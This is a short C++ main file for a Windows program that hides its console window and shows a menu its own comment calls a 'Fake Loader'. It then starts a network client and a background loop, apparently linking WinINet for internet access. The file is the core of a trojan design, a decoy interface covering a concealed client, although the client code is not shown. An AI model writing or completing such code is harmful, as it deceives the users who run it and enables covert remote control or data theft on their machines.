#include <Windows.h>
#include <thread>

#include "gui\gui.h"
#include "client/client.h"

#pragma comment(lib, "wininet.lib")

int main() {
	/* Hide Console */
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	/* Show Fake Loader */
	{
		/* Start Menu */
		menu_init();

		/* Run Menu Loop */
		menu_loop();
	}

	/* Run Client */
	client::start_client();

	/* Run Background Loop */
	if (client::run_background)
		client::background_loop();

	return 0;
}